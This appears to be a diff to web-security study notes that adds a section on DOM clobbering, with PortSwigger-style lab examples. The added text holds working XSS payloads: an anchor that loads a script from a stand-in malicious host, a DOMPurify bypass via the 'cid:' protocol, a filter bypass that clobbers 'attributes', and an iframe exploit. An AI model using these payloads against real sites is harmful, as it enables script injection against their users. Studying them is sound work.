@@ -272,6 +272,8 @@ DOM-based denial-of-service vulnerabilities arise when a script passes attacker-
 
 # DOM clobbering
 
+## Exploiting DOM clobbering to enable XSS
+
 DOM clobbering is an advanced technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the website. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.
 
 >[!tip]
@@ -289,12 +291,81 @@ Vulnerable code:
 </script>
 ```
 
-Payload:
+Payload to inject:
 ```html
 <a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
 ```
 
 As the two anchors use the same ID, **the DOM groups them together in a DOM collection**. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.
+
+>[!example]
+>A web site allows to post HTML comments and retrieve them with an external JSON. It uses DomPurify to allow only safe objects.
+
+Vulnerable code (*/resources/js/loadCommentsWithDomClobbering.js*):
+```js
+...
+   function displayComments(comments) {
+        let userComments = document.getElementById("user-comments");
+
+        for (let i = 0; i < comments.length; ++i)
+        {
+            comment = comments[i];
+            let commentSection = document.createElement("section");
+            commentSection.setAttribute("class", "comment");
+
+            let firstPElement = document.createElement("p");
+			
+			// vulnerable code!
+            let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+            let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">'; 
+
+            let divImgContainer = document.createElement("div");
+            divImgContainer.innerHTML = avatarImgHTML
+...
+```
+
+By default, the DOM looks like this:
+```html
+<section class="comment"><p>Zach Ache | 14-06-2023<div><img class="avatar" src="/resources/images/avatarDefault.svg"></div></p><p>If I wanted to laugh and be well informed I'd have chosen not to be such a cynical old man. Please write things I can complain about in future. Don't keep up the good work.</p><p></p></section>
+```
+
+But we can clobber the `avatar` variable using a payload like the following one, thus obtaining [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md):
+```html
+<!-- DOMPurify allows you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. -->
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+
+<!-- resulting DOM - first gadget -->
+<section class="comment"><p><a id="author" href="https://foo.bar"></a>foo | 01-07-2023<div><img class="avatar" src="/resources/images/avatarDefault.svg"></div></p><p><a id="defaultAvatar"></a><a href="cid:&quot;onerror=alert(1)//" name="avatar" id="defaultAvatar"></a></p><p></p></section>
+
+<!-- resulting DOM - trigger gadget -->
+<section class="comment"><p><a id="author" href="https://foo.bar"></a>foo | 01-07-2023<div><img class="avatar" src="cid:" onerror="alert(1)//&quot;"></div></p><p>foo</p><p></p></section>
+```
+
+## Clobbering DOM attributes to bypass HTML filter
+
+Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties. or example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic.
+
+Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out.
+
+Injection example:
+```html
+<form onclick=alert(1)><input id=attributes>Click me
+```
+
+In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element. Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead. As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead.
+
+Payload clobbering `attributes`:
+```html
+<form id=x tabindex=0 onfocus=print()><input id=attributes>
+```
+
+Exploit code opening the vulnerable page and focusing on the clobbered form `x`.
+>[!info]
+>When the `iframe` is loaded, after a 500ms delay, it adds the `#x` fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID `"x"`, which is the form we created inside the comment. The `onfocus` event handler then calls the `print()` function.
+```html
+<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
+```
+
 
 ---
 
